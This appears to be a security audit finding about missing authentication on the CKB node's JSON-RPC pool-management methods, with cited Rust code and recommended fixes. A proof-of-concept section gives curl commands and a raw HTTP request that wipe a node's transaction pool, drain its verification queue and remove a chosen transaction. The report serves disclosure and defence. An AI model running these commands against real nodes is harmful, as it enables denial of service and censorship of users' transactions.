### Title
Unauthenticated `clear_tx_pool` and `clear_tx_verify_queue` RPC Methods Allow Any Caller to Wipe the Transaction Pool - (`rpc/src/module/pool.rs`)

### Summary

The CKB JSON-RPC server exposes `clear_tx_pool` and `clear_tx_verify_queue` as part of the Pool module with no authentication or caller-identity check of any kind. The HTTP server is configured with `CorsLayer::permissive()` and no IP allowlist or token middleware. Any HTTP client that can reach the RPC listen address can invoke these methods and instantly destroy all pending transaction state, directly analogous to the missing `onlyAcceptedCallers` guard in H-03.

### Finding Description

**Root cause — no access control on destructive pool methods**

`clear_tx_pool` and `clear_tx_verify_queue` are registered as standard Pool-module RPC methods: [1](#0-0) [2](#0-1) 

Their implementations unconditionally forward to the tx-pool service with no caller check: [3](#0-2) 

**RPC server has no authentication layer**

The HTTP server is built with `CorsLayer::permissive()` and no middleware that validates the caller's identity or IP: [4](#0-3) 

Every incoming POST is dispatched directly to the handler with a default metadata value — no token, no IP check, no session validation: [5](#0-4) 

**Pool module is enabled by default in production**

The service builder mounts the Pool module (including `clear_tx_pool`) whenever `pool_enable()` returns true, which is the standard production configuration: [6](#0-5) 

There is no secondary guard inside `enable_pool` that restricts which methods within the module are exposed.

**Attack path**

An attacker who can reach the RPC listen address (any public node, exchange node, or infrastructure node with `listen_address = "0.0.0.0:8114"`) sends:

```
POST / HTTP/1.1
Content-Type: application/json

{"id":1,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}
```

This immediately wipes every pending and proposed transaction from the pool. A follow-up call to `clear_tx_verify_queue` also drains the verification backlog. The attacker can repeat this in a tight loop to keep the pool permanently empty.

Additionally, `remove_transaction` (line 254–255) allows targeted removal of a specific transaction by hash, enabling selective censorship of individual transactions without clearing the entire pool. [7](#0-6) 

### Impact Explanation

- **Tx-pool disruption**: All pending transactions are lost from the node's pool. Miners using this node assemble empty or near-empty blocks, forfeiting transaction fees.
- **Transaction censorship**: `remove_transaction` lets an attacker selectively evict specific transactions (e.g., high-value transfers, DAO withdrawals) before they are committed to a block.
- **Repeated denial of service**: Because the pool refills from the P2P relay layer, the attacker must call `clear_tx_pool` repeatedly, but there is no rate limit or authentication to prevent this.
- **No consensus break**, but sustained pool disruption degrades the node's economic utility and can be used to grief specific users whose transactions are repeatedly evicted.

### Likelihood Explanation

Many production CKB nodes, public RPC providers, exchanges, and mining pools expose the RPC on `0.0.0.0` for remote access. The `CorsLayer::permissive()` setting means even a browser-based script on an attacker-controlled webpage can issue cross-origin requests to a victim's node if the address is known. No credentials, keys, or special protocol knowledge are required — a single HTTP POST suffices.

### Recommendation

1. **Add an authentication layer to the RPC server** (e.g., Bearer token, HTTP Basic Auth, or IP allowlist middleware) before dispatching any request to the handler.
2. **Separate destructive management methods** (`clear_tx_pool`, `clear_tx_verify_queue`, `remove_transaction`) into a distinct, separately-gated admin module that is disabled by default and requires explicit opt-in with a configured secret.
3. **Default `listen_address` to `127.0.0.1`** and document that binding to `0.0.0.0` without authentication is unsafe.

### Proof of Concept

```bash
# Wipe the entire tx pool of a node with RPC exposed on port 8114
curl -s -X POST http://<node-ip>:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# Returns: {"id":1,"jsonrpc":"2.0","result":null}

# Drain the verification queue as well
curl -s -X POST http://<node-ip>:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"clear_tx_verify_queue","params":[]}'

# Selectively remove a known transaction
curl -s -X POST http://<node-ip>:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"remove_transaction","params":["0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"]}'
```

No authentication, no rate limit, and no access control stands between the attacker and full pool disruption.

### Citations

**File:** rpc/src/module/pool.rs (L254-255)
```rust
    #[rpc(name = "remove_transaction")]
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;
```

**File:** rpc/src/module/pool.rs (L322-323)
```rust
    #[rpc(name = "clear_tx_pool")]
    fn clear_tx_pool(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L349-350)
```rust
    #[rpc(name = "clear_tx_verify_queue")]
    fn clear_tx_verify_queue(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L684-701)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }

    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L218-221)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
```

**File:** rpc/src/service_builder.rs (L64-77)
```rust
    /// Mounts methods from module Pool if it is enabled in the config.
    pub fn enable_pool(
        mut self,
        shared: Shared,
        extra_well_known_lock_scripts: Vec<Script>,
        extra_well_known_type_scripts: Vec<Script>,
    ) -> Self {
        let methods = PoolRpcImpl::new(
            shared,
            extra_well_known_lock_scripts,
            extra_well_known_type_scripts,
        );
        set_rpc_module_methods!(self, "Pool", pool_enable, add_pool_rpc_methods, methods)
    }
```
